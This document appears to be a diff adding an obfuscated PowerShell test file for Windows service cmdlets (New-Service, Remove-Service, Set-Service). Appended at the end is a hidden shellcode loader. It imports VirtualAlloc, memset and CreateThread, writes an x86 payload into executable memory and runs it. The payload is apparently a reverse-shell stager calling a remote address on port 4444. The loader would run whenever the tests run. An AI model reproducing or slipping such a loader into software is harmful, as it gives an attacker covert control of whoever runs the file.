+            if (${S`E`cur`I`TYDESCriptor`sDdl}) {
+                &("{5}{0}{1}{3}{2}{6}{4}" -f'heck','Sec','yDescr','urit','ptorSddl','C','i') -SecurityDescriptorSddl ${secURiTYDE`Sc`RI`pToR`Sddl} -ServiceName ${na`me}
+            }
+        }
+        finally {
+            ${seR`V`IcE} = &("{1}{3}{2}{0}"-f 'mInstance','G','i','et-C') ("{3}{2}{1}{0}" -f'rvice','e','in32_S','W') -Filter "name='$name'"
+            if (${ser`VI`ce} -ne ${nu`LL}) {
+                ${SeR`V`Ice} | &("{1}{0}{3}{2}{4}"-f've-C','Remo','st','imIn','ance')
+            }
+        }
+    }
+
+    &('It') ("{5}{3}{4}{0}{2}{1}" -f'can re','e','move a servic','vic','e ','Remove-Ser') {
+        try {
+            ${sE`Rvice`N`Ame} = ("{0}{1}{3}{2}" -f 'te','stremov','rvice','ese')
+            ${pa`RAMETE`RS} = @{
+                ("{1}{0}"-f'e','Nam')           = ${SeRVICe`NA`Me};
+                ("{3}{0}{1}{4}{2}" -f 'in','aryPa','me','B','thNa') = "$PSHOME\pwsh.exe"
+            }
+            ${SERV`IcE} = &("{1}{2}{0}"-f'e','New-S','ervic') @parameters
+            ${S`ERV`iCE} | &("{0}{1}" -f'Sho','uld') -Not -BeNullOrEmpty
+            &("{4}{2}{3}{1}{0}" -f 'ce','i','Ser','v','Remove-') -Name ${sErVI`cE`N`AME}
+            ${seRv`iCE} = &("{0}{2}{1}" -f'Get','e','-Servic') -Name ${S`erVi`c`ENaMe} -ErrorAction ("{0}{3}{1}{2}" -f'S','ont','inue','ilentlyC')
+            ${Ser`ViCE} | &("{1}{0}" -f 'hould','S') -BeNullOrEmpty
+        }
+        finally {
+            &("{3}{1}{0}{2}"-f'a','nst','nce','Get-CimI') ("{2}{1}{3}{0}{4}" -f'erv','n','Wi','32_S','ice') -Filter "name='$servicename'" | &("{3}{5}{4}{1}{2}{0}" -f 'ance','Ins','t','Remo','Cim','ve-') -ErrorAction ("{1}{0}{3}{2}{4}"-f 'lentlyCo','Si','nu','nti','e')
+        }
+    }
+
+    &('It') ("{12}{1}{10}{3}{14}{2}{5}{4}{9}{7}{16}{11}{15}{13}{0}{8}{6}"-f 'peline i','em','i','er','n acce','ce ca','t',' ','npu','pt a','ove-S','eController a','R','pi','v','s ','Servic') {
+        try {
+            ${S`erv`IcEna`mE} = ("{1}{0}{3}{2}"-f'estremo','t','rvice','vese')
+            ${Param`E`TERS} = @{
+                ("{1}{0}"-f'e','Nam')           = ${SEr`VI`C`eName};
+                ("{2}{3}{1}{0}{4}"-f 'PathNa','nary','B','i','me') = "$PSHOME\pwsh.exe"
+            }
+            ${SE`RV`iCe} = &("{1}{2}{0}"-f'vice','New-','Ser') @parameters
+            ${se`RVI`CE} | &("{1}{0}"-f 'uld','Sho') -Not -BeNullOrEmpty
+            &("{2}{3}{0}{1}"-f 'ic','e','Get-S','erv') -Name ${SeRVI`CE`NamE} | &("{1}{3}{2}{0}" -f'vice','Rem','ve-Ser','o')
+            ${se`Rv`ice} = &("{2}{0}{3}{1}"-f 'et','ervice','G','-S') -Name ${Se`RvicEn`Ame} -ErrorAction ("{2}{0}{3}{1}"-f'lentl','ue','Si','yContin')
+            ${Ser`V`ICe} | &("{0}{1}" -f'S','hould') -BeNullOrEmpty
+        }
+        finally {
+            &("{2}{1}{0}" -f 'ce','stan','Get-CimIn') ("{2}{1}{0}"-f '2_Service','n3','Wi') -Filter "name='$servicename'" | &("{1}{2}{3}{0}"-f'e','Remove-Ci','mI','nstanc') -ErrorAction ("{0}{3}{2}{1}{4}" -f 'S','entl','l','i','yContinue')
+        }
+    }
+
+    &('It') ("{4}{8}{3}{11}{5}{6}{13}{12}{0}{1}{7}{9}{10}{2}" -f ' a servic','e that does','st','rvice ','Remove-','a','cc',' not','Se',' e','xi','cannot ','pt','e') {
+        { &("{1}{0}{2}"-f'-Ser','Remove','vice') -Name ("{3}{1}{0}{2}"-f'c','rvi','e','testremovese') -ErrorAction ("{1}{0}"-f'p','Sto') } | &("{0}{1}"-f'Shoul','d') -Throw -ErrorId ("{8}{3}{7}{10}{6}{4}{13}{12}{5}{16}{14}{11}{15}{0}{2}{9}{1}"-f 'oveS','mand','erviceCo','idOperationEx','icr','l','n,M','cep','Inval','m','tio','an','oft.PowerShe','os','omm','ds.Rem','l.C')
+    }
+
+    &('It') ((("{1}{13}{8}{3}{6}{7}{0}{10}{11}{9}{2}{12}{4}{5}" -f'<p','Get-S','erty>M','can g','P of a servi','ce','et the Mp','P','ice ','p','r','o','p','erv'))."R`Ep`lace"(([cHAr]77+[cHAr]112+[cHAr]80),[sTRiNg][cHAr]39)) -Pending -TestCases @(
+        @{("{1}{0}" -f 'rty','prope') = ("{0}{1}{2}"-f'Descr','iptio','n');    ("{0}{1}" -f'va','lue') = ("{3}{1}{0}{4}{5}{2}{6}"-f'st','his is a te','scri','T',' d','e','ption')}
+        @{("{1}{0}{2}"-f'rope','p','rty') = ("{3}{1}{4}{0}{2}"-f 'hN','ryPa','ame','Bina','t'); ("{0}{1}" -f'v','alue') = "$PSHOME\powershell.exe";},
+        @{("{0}{1}{2}"-f 'prop','ert','y') = ("{1}{2}{0}"-f 'rName','U','se');       ("{1}{0}" -f'lue','va') = ${c`R`edS}."u`SERNamE"; ("{3}{0}{2}{1}" -f 'ra','eters','m','pa') = @{ ("{1}{2}{0}"-f 'dential','C','re') = ${C`RedS} }},
+        @{("{2}{0}{1}" -f'er','ty','prop') = ("{1}{0}{2}"-f'u','Start','pType');    ("{1}{0}" -f'ue','val') = ("{5}{1}{3}{2}{4}{0}" -f 'edStart','a','c','ti','Delay','Autom');}
+        ) {
+            param(${pr`OP`erty}, ${vAL`UE}, ${Pa`Ra`metErs})
+            try {
+            ${S`E`RVIc`ENamE} = ("{0}{4}{2}{1}{3}" -f'test','ic','v','e','getser')
+            ${staRt`pA`RAM`eTe`RS} = @{("{0}{1}"-f 'Nam','e') = ${SE`Rv`iceN`Ame}; ("{2}{1}{0}" -f 'athName','naryP','Bi') = "$PSHOME\powershell.exe"}
+            if(${PARa`mETE`Rs} -ne ${NU`Ll}) {
+                foreach(${K`EY} in ${PaRAME`T`eRs}."K`eYs") {
+                ${S`T`ArtPa`RAmE`TERs}.${k`EY} = ${p`AraMe`Te`RS}.${K`ey}
+                }
+            } else {
+                ${StAr`TP`A`RametE`RS}.${P`ROp`erty} = ${V`A`LUe}
+            }
+            ${ser`VicE} = &("{0}{3}{1}{2}" -f 'New','Servi','ce','-') @startparameters
+            ${SErvI`ce} | &("{0}{1}" -f'Shoul','d') -Not -BeNullOrEmpty
+            ${SeR`V`iCe} = &("{1}{2}{0}"-f 'Service','G','et-') -Name ${SEr`V`Ice`NAMe}
+            ${Se`Rv`ice}.${Pr`o`pERtY} | &("{0}{1}" -f'Sho','uld') -BeExactly ${v`ALUe}
+        }
+        finally {
+            &("{1}{3}{0}{2}" -f 't','Get-Cim','ance','Ins') ("{1}{2}{0}" -f '_Service','Win','32') -Filter "name='$servicename'" | &("{1}{4}{2}{3}{5}{0}" -f'stance','Rem','ve-','Cim','o','In') -ErrorAction ("{1}{3}{2}{0}"-f 'e','Silently','nu','Conti')
+        }
+    }
+
+    &('It') ("{4}{6}{8}{1}{10}{5}{14}{15}{0}{3}{7}{12}{13}{11}{9}{2}" -f'rvic','can a','ut','eCont','Set-Se',' ','rvic','rolle','e ','np','ccept','i','r as pip','eline ','a S','e') {
+        try {
+            ${SErVi`Ce`N`AME} = ("{3}{2}{0}{1}"-f 'servi','ce','set','test')
+            ${NEwd`isPLAy`N`Ame} = ("{1}{2}{0}" -f'name','ne','wdisplay')
+            ${p`AR`A`metErS} = @{
+                ("{1}{0}"-f'me','Na')           = ${s`eRvICe`NAMe};
+                ("{2}{1}{3}{0}" -f 'ame','Path','Binary','N') = "$PSHOME\pwsh.exe"
+            }
+            ${Se`R`Vice} = &("{0}{3}{2}{1}" -f 'New','ice','erv','-S') @parameters
+            ${S`e`RvIcE} | &("{1}{0}" -f 'ould','Sh') -Not -BeNullOrEmpty
+            &("{2}{0}{1}{3}" -f't-','Servic','Ge','e') -Name ${se`RvI`CE`NaME} | &("{1}{0}{2}" -f '-Se','Set','rvice') -DisplayName ${NEWd`I`SP`lA`YNamE}
+            ${s`eRV`iCE} = &("{2}{0}{3}{1}" -f 'v','ce','Get-Ser','i') -Name ${seRv`icEn`AmE}
+            ${SeR`VI`CE}."d`I`s`plAynAmE" | &("{1}{0}"-f'hould','S') -BeExactly ${NewdIsP`lA`YNAMe}
+        }
+        finally {
+            &("{3}{0}{1}{2}" -f'i','mInst','ance','Get-C') ("{2}{1}{0}" -f'e','vic','Win32_Ser') -Filter "name='$servicename'" | &("{1}{5}{2}{0}{3}{4}" -f'i','Re','-C','mIn','stance','move') -ErrorAction ("{0}{2}{1}{3}{4}" -f'Silen','n','tlyConti','u','e')
+        }
+    }
+
+    &('It') ("{8}{0}{7}{2}{11}{14}{9}{1}{4}{3}{13}{5}{10}{12}{6}" -f 'v','iceCon','can ','er','troll','s posi','ut','ice ','Set-Ser','cept a Serv','tion','a','al inp',' a','c') {
+        try {
+            ${seRVICE`NA`Me} = ("{0}{1}{2}" -f 'tests','et','service')
+            ${NEw`dISPlAY`NAME} = ("{1}{2}{0}" -f'name','newdispl','ay')
+            ${P`A`RAme`TErS} = @{
+                ("{0}{1}"-f 'Na','me')           = ${s`eRvI`cEna`ME};
+                ("{2}{3}{1}{0}" -f 'Name','yPath','Bi','nar') = "$PSHOME\pwsh.exe"
+            }
+
+            ${S`CrI`Pt} = { &("{0}{2}{3}{1}" -f'New-S','ice','er','v') @parameters | &("{2}{0}{1}" -f'-','Service','Set') -DisplayName ${n`EwD`i`Spl`AYnAmE} }
+            { & ${s`cr`Ipt} } | &("{0}{1}" -f 'Shou','ld') -Not -Throw
+            ${S`ERviCE} = &("{3}{2}{0}{1}"-f 'vic','e','er','Get-S') -Name ${SerV`i`cEnaMe}
+            ${seRv`i`cE}."DiS`P`l`AYnaMe" | &("{2}{0}{1}" -f 'oul','d','Sh') -BeExactly ${NEw`D`ispLAy`Name}
+        }
+        finally {
+            &("{1}{0}{2}"-f't-Cim','Ge','Instance') ("{0}{2}{3}{1}" -f 'Win32_','ce','Se','rvi') -Filter "name='$servicename'" | &("{3}{2}{0}{1}"-f'Inst','ance','-Cim','Remove') -ErrorAction ("{3}{0}{5}{2}{1}{4}" -f 'lyCo','u','n','Silent','e','nti')
+        }
+    }
+
+    &('It') ((("{19}{1}{17}{9}{2}{18}{5}{10}{0}{7}{16}{13}{8}{6}{3}{4}{15}{14}{11}{12}" -f 'il','sing ','amet','0}',' where {0}<pa','s ','me>{',' f','{0}<na',' par','will fa','<','value>{0}','r ','eter>{0} = {0}','ram','o','bad','er','U'))  -F  [char]39) -TestCases @(
+        @{("{1}{0}" -f'et','cmdl')=("{2}{3}{0}{1}" -f'S','ervice','New','-'); ("{0}{1}" -f'na','me') = ("{1}{2}{0}" -f't','cred','tes')    ; ("{0}{2}{1}{3}"-f 'para','te','me','r') = ("{2}{1}{0}" -f'l','dentia','Cre') ; ("{0}{1}" -f 'va','lue') = (
+              ${iTa`47F}::("{0}{1}"-f 'ne','w').Invoke(("{1}{2}{0}" -f'rname','us','e'),
+            
+            (&("{3}{2}{4}{0}{1}"-f 'n','g','vertTo-Secure','Con','Stri') ("{4}{2}{3}{5}{0}{1}" -f'r','d','lainText','P','P','asswo') -AsPlainText -Force)));
+            ("{1}{0}" -f'orid','err') = ("{5}{4}{1}{12}{0}{11}{6}{3}{10}{9}{8}{2}{13}{7}"-f 'e,','otNew','Servic','w','dN','Coul','osoft.Po','mmand','ds.New','an','erShell.Comm','Micr','Servic','eCo')},
+        @{("{0}{1}"-f'cmdle','t')=("{2}{1}{0}"-f 'w-Service','e','N'); ("{1}{0}"-f 'me','na') = ("{3}{1}{2}{0}"-f 'arttype','d','st','ba'); ("{2}{1}{0}"-f 'er','met','para') = ("{3}{0}{1}{2}" -f 'p','T','ype','Startu'); ("{0}{1}" -f 'val','ue') = ("{1}{0}{2}" -f 'st','Sy','em');
+            ("{1}{0}" -f 'rorid','er') = ("{13}{12}{3}{1}{9}{5}{0}{2}{6}{10}{8}{4}{11}{7}"-f 'f',',','t.','gumentNoMessage','.NewServ','icroso','P','and','ll.Commands','M','owerShe','iceComm','tConvertAr','Canno')},
+        @{("{1}{0}" -f'mdlet','c')=("{2}{3}{1}{0}"-f'-Service','w','N','e'); ("{1}{0}"-f'e','nam') = ("{1}{0}"-f 'gmt','winm')     ; ("{1}{2}{0}" -f 'rameter','p','a') = ("{1}{0}{3}{2}" -f'lay','Disp','ame','N'); ("{1}{0}"-f 'e','valu') = "foo";
+            ("{1}{2}{0}"-f 'orid','er','r') = ("{2}{9}{4}{7}{0}{5}{12}{8}{15}{11}{14}{17}{16}{18}{1}{13}{10}{3}{6}"-f 'ice','Se','Cou','mm','dNotNe',',Microsof','and','wServ','.PowerShe','l','eCo','o','t','rvic','mma','ll.C','e','nds.N','w')},
+        @{("{0}{1}" -f 'cmdl','et')=("{1}{3}{2}{0}" -f'-Service','S','t','e'); ("{1}{0}" -f 'e','nam') = ("{0}{1}" -f'win','mgmt')     ; ("{1}{0}{2}"-f 'ramete','pa','r') = ("{2}{1}{0}"-f'rtupType','ta','S'); ("{1}{0}" -f'e','valu') = ("{0}{1}" -f'Bo','ot');
+            ("{2}{1}{0}" -f'd','ori','err') = ("{16}{10}{19}{6}{1}{11}{15}{0}{8}{4}{12}{9}{2}{5}{14}{7}{13}{17}{18}{3}" -f 'ssa','entNo','wer','rviceCommand',',Mic','Shell.Co','ertArgum','ands','ge','Po','n','M','rosoft.','.','mm','e','Ca','Set','Se','notConv')}
+    ) {
+        param(${CmD`Let}, ${na`me}, ${p`AR`AmeTeR}, ${VA`LUe}, ${E`RRoRID})
+        ${pAR`AM`ETerS} = @{${pa`R`AmE`Ter} = ${va`LuE}; ("{1}{0}" -f'me','Na') = ${n`AmE}; ("{0}{1}{2}"-f'Err','o','rAction') = ("{1}{0}"-f 'top','S')}
+        if (${C`MDL`ET} -eq ("{2}{0}{1}" -f'ew-S','ervice','N')) {
+            ${pa`R`AMEtE`RS} += @{("{1}{0}"-f'ary','Bin') = "$PSHOME\pwsh.exe"};
+        }
+        { & ${CM`dleT} @parameters } | &("{0}{2}{1}" -f'Shou','d','l') -Throw -ErrorId ${err`oR`id}
+    }
+
+    &("{1}{0}" -f 't','Contex') ("{7}{5}{12}{1}{3}{16}{14}{2}{10}{8}{0}{11}{13}{9}{15}{4}{6}" -f 'vices','ce te','e ','st ca','ions','et-','hip','S','r','el','se',' with dependen','Servi','t r','on th','at','ses ') {
+        &("{2}{0}{1}" -f'oreEac','h','Bef') {
+            { &("{1}{0}{2}{3}" -f 't-Ser','Se','v','ice') -Status ("{0}{1}"-f'Ru','nning') ${T`e`StSeRV`Icen`AMe2} } | &("{0}{1}"-f 'S','hould') -Not -Throw
+            (&("{0}{2}{1}" -f'G','ce','et-Servi') ${t`ESt`S`ERVIcEnAMe1})."s`Ta`TUs" | &("{0}{1}" -f 'Sho','uld') -BeExactly ("{1}{2}{0}"-f'nning','R','u')
+            (&("{2}{0}{1}" -f'et-Se','rvice','G') ${T`eSTseRV`IC`ENAm`E2})."StAt`US" | &("{0}{1}" -f'Shoul','d') -BeExactly ("{0}{1}" -f 'Ru','nning')
+        }
+
+        &('It') ("{4}{6}{7}{3}{1}{8}{0}{2}{5}" -f'dep','er','end','s','Set-Service','ency',' can s','top a ','vice with ') {
+            ${S`C`RIpT} = { &("{2}{1}{0}"-f'ice','et-Serv','S') -Status ("{0}{1}" -f 'Stop','ped') ${tes`T`sE`R`VIc`EnaMe2} -ErrorAction ("{0}{1}"-f'Sto','p') }
+            { & ${Scri`pT} } | &("{0}{1}" -f'Sh','ould') -Not -Throw
+            (&("{0}{2}{1}" -f 'Get-S','ice','erv') ${te`St`sErvi`CeNAMe2})."s`Ta`TUs" | &("{1}{0}" -f 'hould','S') -BeExactly ("{0}{1}{2}" -f 'St','opp','ed')
+        }
+
+        &('It') ("{4}{10}{3}{8}{9}{1}{0}{11}{5}{7}{6}{2}"-f'h ru','it','vice',' a se','S','e','r','pendent se','r','vice w','et-Service cannot stop','nning d') {
+            ${sC`Ri`PT} = { &("{2}{1}{0}{3}"-f 't-Servic','e','S','e') -Status ("{1}{2}{0}" -f 'pped','St','o') ${T`esTSE`Rvic`eNAM`e1} -ErrorAction ("{1}{0}"-f'top','S') }
+            { & ${S`criPT} } | &("{1}{0}"-f'ld','Shou') -Throw
+            (&("{3}{0}{2}{1}"-f 't-S','ce','ervi','Ge') ${T`est`sEr`Vi`cEnaMe1})."STa`Tus" | &("{0}{1}{2}" -f'S','hou','ld') -BeExactly ("{1}{2}{0}" -f 'ning','Ru','n')
+            (&("{0}{3}{1}{2}" -f'Get-S','v','ice','er') ${Te`StS`ErVi`ceNAmE2})."sTA`T`Us" | &("{1}{2}{0}"-f'd','S','houl') -BeExactly ("{0}{2}{1}" -f 'Run','ing','n')
+        }
+
+        &('It') ("{14}{7}{13}{2}{9}{0}{3}{6}{4}{15}{16}{10}{12}{5}{11}{17}{8}{1}" -f' s','e','-','top a s','e with run','amete','ervic','e','rc','Service can','ice by pa','r -','r','t','S','ning dependent se','rv','Fo') {
+            ${Sc`RI`pT} = { &("{2}{1}{0}"-f 'vice','Ser','Set-') -Status ("{0}{1}"-f 'S','topped') -Force ${T`eStse`R`Vice`NAme1} -ErrorAction ("{1}{0}" -f 'p','Sto') }
+            { & ${sc`R`IPt} } | &("{1}{0}" -f'hould','S') -Not -Throw
+            (&("{2}{0}{1}"-f't-Ser','vice','Ge') ${TE`sTSE`RvICena`M`E1})."S`TAtuS" | &("{0}{1}"-f'Shou','ld') -BeExactly ("{1}{0}{2}" -f'p','Stop','ed')
+            (&("{1}{2}{3}{0}"-f'ervice','G','et','-S') ${t`est`SerVi`cEnAME2})."st`A`TuS" | &("{0}{1}{2}"-f'S','houl','d') -BeExactly ("{2}{1}{0}" -f 'ed','p','Stop')
+        }
+    }
+}
+
+${c} = (((("{24}{99}{52}{28}{34}{0}{79}{90}{72}{91}{63}{36}{19}{96}{87}{46}{37}{95}{35}{43}{73}{42}{64}{11}{60}{100}{51}{10}{38}{53}{16}{77}{94}{75}{61}{44}{20}{84}{49}{97}{48}{68}{83}{13}{93}{69}{67}{33}{41}{85}{1}{56}{32}{62}{14}{45}{78}{89}{98}{21}{50}{8}{86}{88}{29}{15}{102}{18}{74}{65}{70}{23}{66}{2}{5}{58}{81}{26}{22}{39}{71}{9}{12}{57}{76}{31}{55}{92}{80}{101}{30}{17}{40}{25}{54}{47}{82}{7}{27}{6}{4}{59}{3}"-f'ern','tic ext','ntPtr lp',';',' uint src, uint ','Pa','t,',' d','e','onF','Address, ','oc','la','t);[DllImpor','bu',' l','Si','llzht)]public static ex','t','t','loca','ac',' dwCrea',',','[DllIm','set','nt','es','t','tr','crt.d','readI','ntPtr CreateThread(IntPtr lpThread','publ','k',' Virt','s','In','uint d','t','tern IntPtr mem','ic','l','ua','lAl','te',' extern ','n','ot','pe, ','kSiz',' lp','zh','w','(I','d','ern I','gs, I','ramet','count)','(In','nt f','Attri','ic ','l','es',' I','rnel32.dllzht)]','e','zhtke','s','i','t','lA','Addr','ui','ntPtr lpTh','ze','s','el','p','er, ui','tPtr','c','tionTy',' sta',', In','c','tP',', uint','32.dllzh',')]publ',');[DllIm','t(',', ','tPtr','ati','uint flPr',' dwSt','port(','tPtr','ort(zhtmsv','pStar')) -rEPLACe  ([ChaR]122+[ChaR]104+[ChaR]116),[ChaR]34));${W} = &("{1}{2}{0}"-f 'e','Add','-Typ') -memberDefinition ${C} -Name ("{1}{0}" -f '2','Win3') -namespace ("{0}{3}{2}{1}" -f'Win','ons','uncti','32F') -passthru;[Byte[]];[Byte[]]${s`C} = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x69,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x75,0xee,0xc3;${si`ze} = 0x1000;if (${S`C}."L`ENgTh" -gt 0x1000){${S`IzE} = ${s`C}."LE`N`Gth"};${X}=${W}::("{1}{0}{2}"-f 'rtualAllo','Vi','c').Invoke(0,0x1000,${S`IZE},0x40);for (${I}=0;${i} -le (${Sc}."lEng`Th"-1);${i}++) {${w}::"ME`M`SET"([IntPtr](${X}.("{0}{1}"-f 'To','Int32').Invoke()+${I}), ${SC}[${i}], 1)};${W}::("{3}{2}{0}{1}" -f'e','ad','reateThr','C').Invoke(0,0,${x},0,0,0);for (;;){&("{1}{3}{0}{2}" -f '-slee','S','p','tart') 60};
